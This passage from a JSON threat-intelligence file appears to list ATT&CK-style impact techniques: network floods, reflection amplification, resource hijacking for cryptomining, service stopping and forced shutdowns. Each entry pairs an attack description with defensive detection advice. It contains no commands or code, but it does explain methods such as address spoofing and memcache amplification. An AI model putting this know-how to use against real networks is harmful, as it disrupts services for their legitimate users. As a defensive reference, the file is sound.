        "description": " \nAdversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes  \nand to support other malicious activities, including distraction  \n, hacktivism, and extortion.  \n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). \nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets. \nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices. \nFor DoS attacks targeting the hosting system directly, see  Endpoint Denial of Service .  ",
        "detection": "\nDetection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow , SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\n\n"
      },
      "T1498.001": {
        "name": "Direct Network Flood",
        "description": " \nAdversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target.  Direct Network Flood are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well. \nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.  \n ",
        "detection": "\nDetection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow , SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\n\n"
      },
      "T1498.002": {
        "name": "Reflection Amplification",
        "description": " \nAdversaries may attempt to cause a denial of service by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.  \n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS  \nand NTP  \n, though the use of several others in the wild have been documented.  \nIn particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.  \n ",
        "detection": "\nDetection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow , SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\n\n"
      },
      "T1496": {
        "name": "Resource Hijacking",
        "description": " \nAdversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.  \nServers and cloud-based  \nsystems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.  ",
        "detection": "\nConsider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.\n\n"
      },
      "T1489": {
        "name": "Service Stop",
        "description": " \nAdversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.  \n \n \nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as  MSExchangeIS , which will make Exchange content inaccessible  \n. In some cases, adversaries may stop or disable many or all services to render systems unusable.  \nServices may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct  Data Destruction or  Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.  \n ",
        "detection": "\nMonitor processes and command-line arguments to see if critical processes are terminated or stop running.Monitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at HKLM\\SYSTEM\\CurrentControlSet\\Services. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.Alterations to the service binary path or the service startup type changed to disabled may be suspicious.Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, ChangeServiceConfigW may be used by an adversary to prevent services from starting. \n\n"
      },
      "T1529": {
        "name": "System Shutdown/Reboot",
        "description": " \nAdversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.  \nShutting down or rebooting systems may disrupt access to computer resources for legitimate users. \nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as  Disk Structure Wipe or  Inhibit System Recovery , to hasten the intended effects on system availability.  \n \n ",
        "detection": "\nUse process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006.\n\n"
      }
    }
  }
}
